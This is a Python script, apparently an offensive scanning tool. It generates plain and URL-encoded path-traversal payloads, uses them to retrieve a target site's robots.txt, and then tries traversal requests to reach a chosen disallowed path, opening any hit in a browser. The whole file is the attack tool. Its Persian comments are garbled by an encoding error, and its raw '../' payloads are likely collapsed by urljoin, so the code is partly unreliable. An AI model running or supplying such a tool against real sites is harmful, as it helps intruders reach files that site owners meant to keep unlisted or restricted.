import requests
from urllib.parse import urljoin
from selenium import webdriver
from selenium.webdriver.firefox.options import Options

MAX_DEPTH = 10

# Ø³Ø§Ø®Øª Ù„ÛŒØ³Øª Ù…Ø³ÛŒØ±Ù‡Ø§ÛŒ traversal
def generate_paths(filename):
    payloads = []
    for i in range(MAX_DEPTH):
        raw = "../" * i + filename
        encoded = "..%2F" * i + filename
        payloads.extend([raw, encoded])
    return payloads

# Ù¾ÛŒØ¯Ø§ Ú©Ø±Ø¯Ù† ÙØ§ÛŒÙ„ÛŒ Ù…Ø«Ù„ robots.txt Ø¯Ø± Ù…Ø³ÛŒØ±Ù‡Ø§ÛŒ Ù…Ø®ØªÙ„Ù
def find_existing_file(base_url, filename):
    print(f"\n[ğŸ”] Searching for {filename} via path traversal...")
    for path in generate_paths(filename):
        full_url = urljoin(base_url + "/", path)
        print(f"  ğŸ” Testing: {full_url}")
        try:
            r = requests.get(full_url, timeout=5)
            if r.status_code == 200 and "html" not in r.headers.get("Content-Type", ""):
                print(f"  âœ… Found: {full_url}")
                return full_url, r.text
        except Exception as e:
            print(f"  âš ï¸ Error on {full_url}")
    print(f"[âŒ] Could not find {filename}.")
    return None, None

# Ú¯Ø±ÙØªÙ† DisallowÙ‡Ø§
def extract_disallows(robots_content):
    disallows = []
    for line in robots_content.splitlines():
        if line.lower().startswith("disallow:"):
            path = line.split(":", 1)[1].strip()
            disallows.append(path)
    return disallows

# Ø§Ù†ØªØ®Ø§Ø¨ Ù…Ø³ÛŒØ± Ø§Ø² Ù„ÛŒØ³Øª
def choose_from_list(options):
    print("\n[ğŸ§­] Disallowed paths:")
    for idx, item in enumerate(options):
        print(f"  [{idx}] {item}")
    while True:
        choice = input("Select the number of the path to test: ")
        if choice.isdigit() and 0 <= int(choice) < len(options):
            return options[int(choice)]
        print("Invalid choice.")

# Ø¨Ø§Ø² Ú©Ø±Ø¯Ù† Ø¢Ø¯Ø±Ø³ Ø¯Ø± Ù…Ø±ÙˆØ±Ú¯Ø±
def open_in_browser(url):
    print(f"[ğŸŒ] Launching browser for: {url}")
    options = Options()
    options.headless = False
    driver = webdriver.Firefox(options=options)
    driver.get(url)

# Ø§Ø¬Ø±Ø§ÛŒ Ù…Ø³ÛŒØ± Ø§Ù†ØªØ®Ø§Ø¨ÛŒ Ù…Ø«Ù„ ÙØ§ÛŒÙ„ Ø§ÙˆÙ„
def find_and_open_disallowed(base_url, path):
    filename = path.lstrip("/")  # Ø­Ø°Ù / Ø§Ø¨ØªØ¯Ø§ÛŒÛŒ
    print(f"\n[ğŸ”] Searching for {filename} via path traversal...")
    for p in generate_paths(filename):
        full_url = urljoin(base_url + "/", p)
        print(f"  ğŸ” Testing: {full_url}")
        try:
            r = requests.get(full_url, timeout=5)
            if r.status_code == 200:
                print(f"  âœ… Found: {full_url}")
                open_in_browser(full_url)
                return
        except:
            print(f"  âš ï¸ Error on {full_url}")
    print("[âŒ] Could not find the selected disallowed path.")

# Ø¨Ø±Ù†Ø§Ù…Ù‡ Ø§ØµÙ„ÛŒ
def main():
    base_url = input("Enter your URL (with https://): ").strip().rstrip("/")

    # Ù…Ø±Ø­Ù„Ù‡ Ø§ÙˆÙ„: Ù¾ÛŒØ¯Ø§ Ú©Ø±Ø¯Ù† robots.txt
    robots_url, robots_content = find_existing_file(base_url, "robots.txt")
    if not robots_url:
        return

    # Ù…Ø±Ø­Ù„Ù‡ Ø¯ÙˆÙ…: Ú¯Ø±ÙØªÙ† Ù…Ø³ÛŒØ±Ù‡Ø§ Ø§Ø² robots.txt
    disallows = extract_disallows(robots_content)
    if not disallows:
        print("[-] No disallowed paths found.")
        return

    # Ù…Ø±Ø­Ù„Ù‡ Ø³ÙˆÙ…: Ø§Ù†ØªØ®Ø§Ø¨ Ù…Ø³ÛŒØ±
    chosen = choose_from_list(disallows)

    # Ù…Ø±Ø­Ù„Ù‡ Ú†Ù‡Ø§Ø±Ù…: Ù¾ÛŒØ¯Ø§ Ú©Ø±Ø¯Ù† Ù…Ø³ÛŒØ± Ø§Ù†ØªØ®Ø§Ø¨â€ŒØ´Ø¯Ù‡ Ø¨Ø§ traversal
    find_and_open_disallowed(base_url, chosen)

if __name__ == "__main__":
    main()
